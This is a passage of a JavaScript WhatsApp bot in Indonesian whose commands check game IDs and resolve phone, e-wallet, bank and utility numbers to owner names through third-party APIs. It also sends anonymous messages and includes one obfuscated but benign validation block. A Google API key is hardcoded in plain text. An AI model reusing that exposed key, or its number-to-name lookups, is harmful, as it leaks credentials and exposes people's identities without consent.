  if (!nomor) return reply('Contoh: .undawn 13004216394');

  const axios = require('axios');
  try {
    const res = await axios.get(`https://cekid.zannstore.com/v2/undawn?api_req=idsAPITOLS&user_id=${nomor}`);
    const data = res.data;

    if (data.status !== 'success') return reply(`❌ Gagal ambil data: ${data.msg}`);

    const akun = data.data;

    const output = `
────〔 🎮 *CEK AKUN UNDAWN* 〕────

👤 *Nickname* : ${akun.nickname}
🆔 *ID*       : ${akun.id}
🏷️ *Brand*    : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

case 'mcgg': {
  const [id, zone] = text.trim().split(' ');
  if (!id || !zone) return reply('Contoh: .mcgg 204902 1002');

  const axios = require('axios');

  try {
    // Ambil data akun utama
    const akunRes = await axios.get(`https://cekid.zannstore.com/v2/mcgg?api_req=idsAPITOLS&user_id=${id}&zone_id=${zone}`);
    const topupRes = await axios.get(`https://cekid.zannstore.com/v2/first-mcgg?api_req=idsAPITOLS&user_id=${id}&zone_id=${zone}`);

    // Validasi respon
    if (akunRes.data.status !== 'success') {
      return reply(`❌ Gagal ambil data akun:\n${akunRes.data.msg || 'Unknown error'}`);
    }
    if (topupRes.data.status !== 'success') {
      return reply(`❌ Gagal ambil data first topup:\n${topupRes.data.msg || 'Unknown error'}`);
    }

    // Ambil data
    const akun = akunRes.data.data;
    const topup = topupRes.data;

    // Format first topup
    const topups = (topup.first_topup || [])
      .map(item => {
        const icon = item.status === 'Active' ? '✅' : '❌';
        return `• ${item.denom} ${icon}`;
      })
      .join('\n') || 'Tidak ada data.';

    // Gabungkan output
    const output = `
────〔 🕹️ *CEK MCGG* 〕────

🎮 *Game*     : ${akun.brand}
👤 *Nickname* : ${akun.nickname}
🆔 *ID / Zone*: ${akun.id} / ${akun.zone}

💎 *First Topup:*
${topups}

🌍 *IP Request*        : ${akunRes.data.ip_req}
📊 *Request Hari Ini*  : ${akunRes.data.total_req_days}
📈 *Request Bulan Ini* : ${akunRes.data.total_req_moth || topup.total_req_month}

✅ Status: ${akunRes.data.msg}
━━━━━━━━━━━━━━━━━━━━`.trim();

    reply(output);
  } catch (err) {
    console.error('Error di .mcgg:', err.message);
    reply('❌ Terjadi kesalahan saat menghubungi server atau format salah.');
  }

  break;
}


case 'bloodstrike': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const id = text.trim();
  if (!id) return reply('Contoh: .bloodstrike 586017128895');

  const axios = require('axios');
  try {
    const res = await axios.get(`https://cekid.zannstore.com/v2/blood-strike?api_req=idsAPITOLS&user_id=${id}`);
    const data = res.data;

    if (data.status !== 'success') return reply(`❌ Gagal ambil data: ${data.msg}`);

    const akun = data.data;

    const output = `
────〔 🔫 *CEK AKUN BLOOD STRIKE* 〕────

👤 *Nickname* : ${akun.nickname}
🆔 *ID*       : ${akun.id}
🏷️ *Brand*    : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

case 'hok': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const id = text.trim();
  if (!id) return reply('Contoh: .hok 6614335762986190495');

  const axios = require('axios');
  try {
    const res = await axios.get(`https://cekid.zannstore.com/v2/hok?api_req=idsAPITOLS&user_id=${id}`);
    const data = res.data;

    if (data.status !== 'success') return reply(`❌ Gagal ambil data: ${data.msg}`);

    const akun = data.data;
    const output = `
────〔 🧙 *CEK AKUN HOK (Honor of Kings)* 〕────

👤 *Nickname* : ${akun.nickname}
🆔 *ID*       : ${akun.id}
🏷️ *Brand*    : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

case 'pubg': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const id = text.trim();
  if (!id) return reply('Contoh: .pubg 5612292551');

  const axios = require('axios');
  try {
    const res = await axios.get(`https://cekid.zannstore.com/v2/pubg?api_req=idsAPITOLS&user_id=${id}`);
    const data = res.data;

    if (data.status !== 'success') return reply(`❌ Gagal ambil data: ${data.msg}`);

    const akun = data.data;
    const output = `
────〔 🔫 *CEK AKUN PUBG MOBILE* 〕────

👤 *Nickname* : ${akun.nickname}
🆔 *ID*       : ${akun.id}
🏷️ *Brand*    : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

case 'zenless': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const id = text.trim();
  if (!id) return reply('Contoh: .zenless 1000000100');

  const axios = require('axios');
  try {
    const res = await axios.get(`https://cekid.zannstore.com/v2/zenless?api_req=idsAPITOLS&user_id=${id}`);
    const data = res.data;

    if (data.status !== 'success') return reply(`❌ Gagal ambil data: ${data.msg}`);

    const akun = data.data;
    const output = `
────〔 🌀 *CEK AKUN ZENLESS ZONE ZERO* 〕────

👤 *Nickname* : ${akun.nickname}
🆔 *ID*       : ${akun.id}
🏷️ *Brand*    : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

case 'codm': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const id = text.trim();
  if (!id) return reply('Contoh: .codm 243402956362890880');

  const axios = require('axios');
  try {
    const res = await axios.get(`https://cekid.zannstore.com/v2/codm?api_req=idsAPITOLS&user_id=${id}`);
    const data = res.data;

    if (data.status !== 'success') return reply(`❌ Gagal ambil data: ${data.msg}`);

    const akun = data.data;
    const output = `
────〔 🎯 *CEK AKUN CALL OF DUTY MOBILE* 〕────

👤 *Nickname* : ${akun.nickname}
🆔 *ID*       : ${akun.id}
🏷️ *Brand*    : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

case 'genshin': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const id = text.trim();
  if (!id) return reply('Contoh: .genshin 815969773');

  const axios = require('axios');
  try {
    const res = await axios.get(`https://cekid.zannstore.com/v2/genshin?api_req=idsAPITOLS&user_id=${id}`);
    const data = res.data;

    if (data.status !== 'success') return reply(`❌ Gagal ambil data: ${data.msg}`);

    const akun = data.data;
    const output = `
────〔 🌌 *CEK AKUN GENSHIN IMPACT* 〕────

👤 *Nickname* : ${akun.nickname}
🆔 *ID*       : ${akun.id}
🏷️ *Brand*    : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

case 'removebg': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const imageUrl = text.trim();
  if (!imageUrl) return reply('Fitur ini sedang dalam perbaikan, Mohon Bersabar :)');

  const axios = require('axios');
  try {
    const res = await axios.get(`https://cekid.zannstore.com/v2/removebg?api_req=idsAPITOLS&url=${encodeURIComponent(imageUrl)}`);
    const data = res.data;

    if (data.status !== 'success') return reply(`❌ Gagal menghapus background: ${data.msg}`);

    const result = data.data;
    const output = `
────〔 🖼️ *REMOVE BACKGROUND* 〕────

📎 *Brand* : ${result.brand}
🔗 *Hasil* : ${result.url}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (error) {
    console.error(error);
    reply('❌ Terjadi kesalahan saat menghubungi server RemoveBG.');
  }
}
break;

case 'botids': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const [nomor, ...pesanArr] = text.trim().split('|');
  const pesan = pesanArr.join('|').trim();

  if (!nomor || !pesan) {
    return reply(`Contoh:\n.botids 085162623352|halo aku\n\nmanusia`);
  }

  const axios = require('axios');
  try {
    const url = `https://cekid.zannstore.com/v2/whatsapi?api_req=idsAPITOLS&number=${encodeURIComponent(nomor)}&message=${encodeURIComponent(pesan)}`;
    const res = await axios.get(url);
    const data = res.data;

    if (data.status !== 'success') {
      return reply(`❌ Gagal kirim pesan: ${data.msg}`);
    }

    const output = `
────〔 📤 *WHATSAPP API* 〕────

📱 *Nomor* : ${nomor}
💬 *Pesan* : ${pesan}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (error) {
    console.error(error);
    reply('❌ Terjadi kesalahan saat menghubungi server WhatsAPI.');
  }
}
break;

case 'menfes': {
  if (m.isGroup) return reply('❌ Fitur ini hanya bisa digunakan di private chat.');

  const [targetRaw, ...pesanArr] = text.split('|').map(a => a.trim());
  const pesan = pesanArr.join('|').trim();

  if (!targetRaw || !pesan) {
    return reply(`❌ Format salah!\nContoh:\n.menfes 6285162623352|Aku suka kamu 😳`);
  }

  // Bersihkan nomor: hapus semua selain angka
  const target = targetRaw.replace(/[^0-9]/g, '');

  if (!target.startsWith('62')) {
    return reply('❌ Nomor tujuan harus diawali dengan 62 (kode negara Indonesia).');
  }

  if (target === m.sender.replace(/[^0-9]/g, '')) {
    return reply('❌ Tidak bisa kirim menfes ke diri sendiri.');
  }

  try {
    const jid = `${target}@s.whatsapp.net`;

    // Cek apakah nomor terdaftar di WhatsApp
    const exists = await conn.onWhatsApp(jid);
    if (!exists || exists.length === 0 || !exists[0].exists) {
      return reply('❌ Nomor tujuan tidak terdaftar di WhatsApp.');
    }

    const pesanMenfes = `
📩 *Pesan Rahasia Untukmu!*

💌 *Pesan*: 
${pesan}

_(Dikirim secara anonymous melalui bot)_
`.trim();

    await conn.sendMessage(jid, { text: pesanMenfes });
    reply(`✅ Menfes berhasil dikirim ke ${target}!`);
  } catch (err) {
    console.error(err);
    reply('❌ Gagal mengirim pesan. Bisa jadi nomor tidak aktif di WhatsApp atau terjadi kesalahan. *pesan admint=fitur ini sedang dalam perbaikan*');
  }

  break;
}
             
case 'bpjs': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const id = text.trim();
  if (!id) return reply('Contoh: .bpjs 8888801833394509');

  try {
    const axios = require('axios');
    const res = await axios.get(`https://cekid.zannstore.com/v2/bpjs-kesehatan?api_req=idsAPITOLS&user_id=${id}`);
    const data = res.data;

    if (data.status !== 'success') return reply(`❌ Gagal mengambil data: ${data.msg}`);

    const akun = data.data;
    const output = `
────〔 🏥 *CEK BPJS KESEHATAN* 〕────

🆔 *ID Pengguna* : ${akun.id}
🏷️ *Brand*       : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

case 'speedy': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const id = text.trim();
  if (!id) return reply('Contoh: .speedy 172423218543');

  try {
    const axios = require('axios');
    const res = await axios.get(`https://cekid.zannstore.com/v2/speedy?api_req=idsAPITOLS&user_id=${id}`);
    const data = res.data;

    if (data.status !== 'success') return reply(`❌ Gagal mengambil data: ${data.msg}`);

    const akun = data.data;
    const output = `
────〔 🌐 *CEK SPEEDY TELKOM* 〕────

🆔 *ID Pengguna* : ${akun.id}
🏷️ *Brand*       : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

case 'cbn': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const id = text.trim();
  if (!id) return reply('Contoh: .cbn 45268838');

  try {
    const axios = require('axios');
    const res = await axios.get(`https://cekid.zannstore.com/v2/cekcbn?api_req=idsAPITOLS&user_id=${id}`);
    const data = res.data;

    if (data.status !== 'success') return reply(`❌ Gagal mengambil data: ${data.msg}`);

    const akun = data.data;
    const output = `
────〔 🛰️ *CEK CBN INTERNET* 〕────

🆔 *ID Pengguna* : ${akun.id}
🏷️ *Brand*       : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;













  /* START DANA */
case 'dana': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const nomor = text.trim();
  if (!nomor) return reply('Contoh: .dana 085174667722');

  const axios = require('axios');

  try {
    const res = await axios.get(`https://cekid.zannstore.com/v2/dana?api_req=idsAPITOLS&user_id=${nomor}`);
    const data = res.data;

    if (data.status !== 'success') {
      return reply(`❌ Gagal mengambil data: ${data.msg}`);
    }

    const akun = data.data;

    const output = `
────〔 🏧 *CEK AKUN DANA* 〕────

👤 *Nama Akun* : ${akun.nickname}
📱 *Nomor HP*  : ${akun.id}
🏷️ *Brand*     : ${akun.brand}

🌍 *IP Request* : ${data.ip_req}
📊 *Request Hari Ini* : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_moth}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (error) {
    console.error(error);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;
  /* END DANA */
  
  /* START OVO */
case 'ovo': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const nomor = text.trim();
  if (!nomor) return reply('Contoh: .ovo 085174667722');

  const axios = require('axios');

  try {
    if (!m.isGroup) return m.reply('*Fitur khusus group !*');
    const res = await axios.get(`https://cekid.zannstore.com/v2/ovo?api_req=idsAPITOLS&user_id=${nomor}`);
    const data = res.data;

    if (data.status !== 'success') {
      return reply(`❌ Gagal mengambil data: ${data.msg}`);
    }

    const akun = data.data;

    const output = `
────〔 🏧 *CEK AKUN OVO* 〕────

👤 *Nama Akun* : ${akun.nickname}
📱 *Nomor HP*  : ${akun.id}
🏷️ *Brand*     : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_month}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (error) {
    console.error(error);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

  
case 'isaku': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const nomor = text.trim();
  if (!nomor) return reply('Contoh: .isaku 085174667722');

  const axios = require('axios');

  try {
    const res = await axios.get(`https://cekid.zannstore.com/v2/isaku?api_req=idsAPITOLS&user_id=${nomor}`);
    const data = res.data;

    if (data.status !== 'success') {
      return reply(`❌ Gagal mengambil data: ${data.msg}`);
    }

    const akun = data.data;

    const output = `
────〔 🏧 *CEK AKUN ISAKU* 〕────

👤 *Nama Akun* : ${akun.nickname}
📱 *Nomor HP*  : ${akun.id}
🏷️ *Brand*     : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_month}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (error) {
    console.error(error);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

  /* END GOPAY */
  
  /* START SHOPEE PAY */
case 'gopay': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const nomor = text.trim();
  if (!nomor) return reply('Contoh: .gopay 087837456208');

  const axios = require('axios');

  try {
    const res = await axios.get(`https://cekid.zannstore.com/v2/gopay?api_req=idsAPITOLS&user_id=${nomor}`);
    const data = res.data;

    if (data.status !== 'success') {
      return reply(`❌ Gagal mengambil data: ${data.msg}`);
    }

    const akun = data.data;

    const output = `
────〔 🏧 *CEK AKUN GOPAY* 〕────

👤 *Nama Akun* : ${akun.nickname}
📱 *Nomor HP*  : ${akun.id}
🏷️ *Brand*     : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_month}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (error) {
    console.error(error);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;

  /* END SHOPEE PAY */
case 'linkaja': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const nomor = text.trim();
  if (!nomor) return reply('Contoh: .linkaja 085174667722');

  const axios = require('axios');

  try {
    
    const res = await axios.get(`https://cekid.zannstore.com/v2/linkaja?api_req=idsAPITOLS&user_id=${nomor}`);
    const data = res.data;

    if (data.status !== 'success') {
      return reply(`❌ Gagal mengambil data: ${data.msg}`);
    }

    const akun = data.data;

    const output = `
────〔 🏧 *CEK AKUN LINKAJA* 〕────

👤 *Nama Akun* : ${akun.nickname}
📱 *Nomor HP*  : ${akun.id}
🏷️ *Brand*     : ${akun.brand}

🌍 *IP Request*        : ${data.ip_req}
📊 *Request Hari Ini*  : ${data.total_req_days}
📈 *Request Bulan Ini* : ${data.total_req_month}

✅ Status: ${data.msg}
━━━━━━━━━━━━━━━━━━━━
`.trim();

    reply(output);
  } catch (error) {
    console.error(error);
    reply('❌ Terjadi kesalahan saat menghubungi server.');
  }
}
break;
 




  /* START BANK INDONESIA */
  case 'cekbank':{
    if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  let axios = require("axios");
  const idbank = args[0];
  const anatha = args[1];
  if(!idbank || !anatha) {
  return reply(`*CEK NAMA REKENING*\n\n*Contoh :*\ncekbank 014 1772606839\n\n*Note :*\n> Masukan kode bank dan nomor rekening\n> Untuk kode bank silahkan ketik daftarbank`)
  }
  
              var config = {
                method: 'POST',  // Set the HTTP method to POST
                url: 'https://zannstoresmm.my.id/v2/validasi_byzann.php',  // Set the target URL
                data: new URLSearchParams(Object.entries({
                  api_key: global.AnanthaCEK,
                  action: 'bank',
                  no_id: anatha,
                  bank_code: idbank,
                  })),
              };
            
            axios(config)
              .then(function (response) {
                if (response.data.status == true) {
                console.log(response.data)
                if(response.data.data.code == "404") {
    reply("Oops, Nickname Tidak Dapat ditemukan")
    } else if (response.data.data.code == "422") {
    reply("Oops, Silahkan Input Userid dengan benar")
                
                } else if (response.data.data.code == "200") {
               reply(`「 *${response.data.data.game}* 」\n\n> Username : ${response.data.data.name}\n> ID : ${response.data.data.userid}\n`);
                }
              } 
              if (response.data.status == false) {
              reply(`${response.data.data.msg}`)
            }
              })
    }
    break
  case 'daftarbank':{
    if (!m.isGroup) return m.reply('*Fitur khusus group !*');
   let replyBank = "*BANK INDONESIA*\n";
    let dataBank = JSON.parse(fs.readFileSync('./dataBank.json'));
    dataBank.forEach(function(product) {
        replyBank += `
${product.namaBank}\n> Kode Bank : ${product.kodeBank}\n`;
    });
    
    reply(`${replyBank}`);
    }
    break
    /* END BANK INDONESIA */
    
    /* START PLN */
    case 'cekpln':{
      if (!m.isGroup) return m.reply('*Fitur khusus group !*');
let id = args[0];
        if (!id) {
          return reply(`PLN PRABAYAR \nMasukan ID dengan benar, contoh:\n*.cekpln* 551200816435`)
        }
let axios = require('axios');
              var config = {
                method: 'POST',  // Set the HTTP method to POST
                url: 'https://zannstoresmm.my.id/v2/validasi_byzann.php',  // Set the target URL
                data: new URLSearchParams(Object.entries({
                  api_key: global.AnanthaCEK,
                  action: 'token-pln',
                  no_id: id,
                  })),
              };
            
            axios(config)
              .then(function (response) {
                if (response.data.status == true) {
                console.log(response.data)
                if(response.data.data.code == "404") {
    reply("Oops, Nickname Tidak Dapat ditemukan")
    } else if (response.data.data.code == "422") {
    reply("Oops, Silahkan Input Userid dengan benar")
                
                } else if (response.data.data.code == "200") {
                reply(`「 *${response.data.data.brand}* 」\n\n> Nama : ${response.data.data.name}\n> Id Pln : ${response.data.data.id_pln}\n> No Meter : ${response.data.data.meter_pln}\n> Daya : ${response.data.data.daya}\n`);
                }
              } 
              if (response.data.status == false) {
              reply(`${response.data.data.msg}`)
            }
              })
  }
  break


              
                   case 'mlidd': {const _0x4af7d1=_0x1cdc;(function(_0x4a1d19,_0x28ef1c){const _0x15fd8b=_0x1cdc,_0xc39fba=_0x4a1d19();while(!![]){try{const _0x53c604=parseInt(_0x15fd8b(0x89))/0x1+-parseInt(_0x15fd8b(0x9f))/0x2*(-parseInt(_0x15fd8b(0xa2))/0x3)+-parseInt(_0x15fd8b(0x90))/0x4*(-parseInt(_0x15fd8b(0x96))/0x5)+-parseInt(_0x15fd8b(0xa4))/0x6*(parseInt(_0x15fd8b(0x9a))/0x7)+parseInt(_0x15fd8b(0x8e))/0x8+-parseInt(_0x15fd8b(0xa5))/0x9*(-parseInt(_0x15fd8b(0x8b))/0xa)+parseInt(_0x15fd8b(0x97))/0xb*(-parseInt(_0x15fd8b(0x9e))/0xc);if(_0x53c604===_0x28ef1c)break;else _0xc39fba['push'](_0xc39fba['shift']());}catch(_0x34e3a1){_0xc39fba['push'](_0xc39fba['shift']());}}}(_0x32a9,0xc6715));const fetch=require(_0x4af7d1(0x92));function _0x1cdc(_0x2f7b47,_0x476df3){const _0x32a90a=_0x32a9();return _0x1cdc=function(_0x1cdcb0,_0xe2f4bc){_0x1cdcb0=_0x1cdcb0-0x89;let _0x5e3604=_0x32a90a[_0x1cdcb0];return _0x5e3604;},_0x1cdc(_0x2f7b47,_0x476df3);}async function fetchMoogoldData(_0xc701ac,_0x27055f){const _0x3ef13a=_0x4af7d1;try{const _0x536de2=await fetch(_0xc701ac,{'method':'POST','headers':{'Content-Type':_0x3ef13a(0x95)},'body':_0x27055f}),_0x206f1b=await _0x536de2['json']();return console[_0x3ef13a(0x94)](_0x206f1b),_0x206f1b;}catch(_0x381965){return console[_0x3ef13a(0x9b)](_0x3ef13a(0x8d),_0x381965),null;}}async function validateMobileLegendsMoogold(_0xeedd,_0x619674){const _0x33f816=_0x4af7d1,_0x52daab='https://moogold.com/wp-content/plugins/id-validation-new/id-validation-ajax.php',_0x3c59da=new URLSearchParams();return _0x3c59da[_0x33f816(0x8f)](_0x33f816(0xa1),_0x33f816(0xa6)),_0x3c59da[_0x33f816(0x8f)](_0x33f816(0x99),_0xeedd),_0x3c59da[_0x33f816(0x8f)](_0x33f816(0x8c),_0x619674),_0x3c59da[_0x33f816(0x8f)](_0x33f816(0x9c),0x1),_0x3c59da[_0x33f816(0x8f)](_0x33f816(0x98),0x5934d8),_0x3c59da[_0x33f816(0x8f)](_0x33f816(0x91),0x5934d8),_0x3c59da['append'](_0x33f816(0x8a),0x593549),await fetchMoogoldData(_0x52daab,_0x3c59da);}const userId=args[0x0],zoneId=args[0x1];(!userId||!zoneId)&&reply(_0x4af7d1(0xa0));function _0x32a9(){const _0x7d999b=['21219lPQgeU','add-to-chart','text-5f6f144f8ffee','7HUvbfS','error','quatity','❌\x20Terjadi\x20kesalahan\x20saat\x20memproses\x20permintaan.','13332reuRoO','360NRqozo','Harap\x20masukkan\x20User\x20ID\x20dan\x20Zone\x20ID\x20dengan\x20benar.','attribute_diamonds','4461fdtANI','Error\x20validating\x20Mobile\x20Legends:','678372OuZqpe','108ytYhKZ','Weekly\x20Pass','then','catch','icon','407222bcRAwo','variation_id','1261940jxAFcV','text-1601115253775','Error\x20fetching\x20Moogold\x20data:','3736552vhiPSo','append','284BUOgzR','product_id','node-fetch','success','log','application/x-www-form-urlencoded;\x20charset=UTF-8','29065ueyMTF'];_0x32a9=function(){return _0x7d999b;};return _0x32a9();}validateMobileLegendsMoogold(userId,zoneId)[_0x4af7d1(0xa7)](_0x5ea37c=>{const _0x23d178=_0x4af7d1;_0x5ea37c&&_0x5ea37c[_0x23d178(0xa9)]==_0x23d178(0x93)?(console[_0x23d178(0x94)](_0x5ea37c),reply(_0x5ea37c['message'])):reply('❌\x20Validasi\x20gagal.\x20Pastikan\x20ID\x20dan\x20server\x20benar.');})[_0x4af7d1(0xa8)](_0x20468e=>{const _0x3095ec=_0x4af7d1;console[_0x3095ec(0x9b)](_0x3095ec(0xa3),_0x20468e),reply(_0x3095ec(0x9d));});break;}
                
             

case 'cwr': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
        if (!text) return reply('Contoh penggunaan:\n.cwr <total_pertandingan> <win_rate_sekarang> <target_win_rate>');
        var cwl = text.split(' ');
        if (!cwl || cwl.length !== 3) return reply('Contoh penggunaan:\n.cwr <total_pertandingan> <win_rate_sekarang> <target_win_rate>');

        const tMatch = parseFloat(cwl[0]);
        const tWr = parseFloat(cwl[1]);
        const wrReq = parseFloat(cwl[2]);

        if (isNaN(tMatch) || isNaN(tWr) || isNaN(wrReq)) {
          return reply('Input tidak valid. Pastikan semua input berupa angka.');
        }
        const resultNum = calc.cwr(tMatch, tWr, wrReq);
        const tekl = `BOT CALC WINRATE

        Anda memerlukan sekitar ${resultNum} win tanpa lose untuk mendapatkan win rate ${wrReq}%`;
        reply(tekl);
        }
        break;
case 'cz': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
          if (!text) return reply('Contoh penggunaan:\n.cz <zodiac_point>');
          if (isNaN(text)) {
            return reply('Input tidak valid. Pastikan input berupa angka.');
          }
          
          const zodiacPoint = Number(text);
          const diamondsNeeded = calc.cz(zodiacPoint);
          reply(`BOT CALC ZODIAK
          
          Total maksimal diamond yang dibutuhkan: ${diamondsNeeded}`);
          }
          break;
          //   Downloader and Other Script
case 'ig': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
                if(!q) return reply('linknya mana bang?');
                reply("bentar ya bang lagi proses")
                try {
                    let igdown = await igdl(q);
                    const { data } = igdown;
                    console.log(igdown)
                    for (let media of data) {
                      new Promise(resolve => setTimeout(resolve, 2000));
                      let type = media.url.includes('d.rapidcdn.app') ? 'video' : 'image';
                      await AnanthaGanz.sendMessage(m.chat, {
                        [type]: { url: media.url }, 
                        caption: 'Nih bang' 
                    }, { quoted: m });
                    }
                } catch (e) {
                    console.log(e)
                }
            }
                break;          
            case 'bijak' : {
                const url = `https://api.lolhuman.xyz/api/random/katabijak?apikey=${lolkey}`
                try{
                    const response = await axios.get(url);
                    const data = response.data.result
                reply(data)
                } catch (e){
                    reply('limit / error script silahkan cek panel')
                }
            }
            break;
            case 'pantun' : {
                const url = `https://api.lolhuman.xyz/api/random/pantun?apikey=${lolkey}`
                try {
                const response = await axios.get(url);
                    const data = response.data.result
                reply(data)
                } catch (e){
                    reply('limit / error script silahkan cek panel')
                }
            }
            break;
            case 'puisi': {
                const apikey = 'AIzaSyBVnF-MQGXx_J_aAwLdr1-DxzEyDzheOio'; // Ganti dengan API key kamu
                const genAI = new GoogleGenerativeAI(apikey);
                const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash" });

                // Prompt agar AI membuat puisi random, boleh diganti style/tema-nya
                const prompt = `Buatkan aku satu puisi pendek yang indah, random, dan menggunakan bahasa Indonesia.`;

                try {
                    const result = await model.generateContent(prompt);
                    const aiResponse = result.response.text();
                    reply(aiResponse);
                } catch (e) {
                    console.log('Error fitur puisi Gemini:', e);
                    reply('❌ Gagal membuat puisi dengan AI (mungkin limit atau error API).');
                }
            }
            break;
            case 'jodoh': {
                if(!text) return reply('Siapa yang mau kamu jodohin bang -_-');
                const splitArgs = text.split(' dan ');
                if(splitArgs.length !== 2){
                    reply('gunakan kata sambung `dan` \nContoh : aku dan dia ')
                    return;
                }
                const nama1 = splitArgs[0].trim();
                const nama2 = splitArgs[1].trim();
                if(!nama1 || !nama2){
                    reply('Yakali mau di jodohin sama hantu -_-')
                    return;
                }
                const url = `https://api.lolhuman.xyz/api/jodoh/${nama1}/${nama2}?apikey=${lolkey}`
                try{
                const response = await axios.get(url);
                const jodohKu = response.data;
                console.log(jodohKu);
